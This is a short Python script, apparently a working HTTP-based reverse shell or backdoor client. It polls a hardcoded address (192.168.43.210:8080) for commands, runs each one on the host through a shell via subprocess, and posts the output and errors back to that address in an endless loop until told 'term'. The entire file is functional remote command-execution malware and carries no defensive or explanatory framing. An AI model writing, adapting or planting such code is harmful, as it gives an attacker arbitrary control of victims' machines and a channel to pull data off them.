import requests as req
import time
import subprocess as sb

myurl = 'http://192.168.43.210:8080'


while True:
	r= req.get(myurl)
	com = r.text
	if com=='term':
		break
	myp = sb.Popen(com,stdin=sb.PIPE,stdout=sb.PIPE,stderr=sb.PIPE,shell=True)
	sout,serr = myp.communicate()
	req.post(myurl,sout)
	req.post(myurl,serr)
	time.sleep(3)
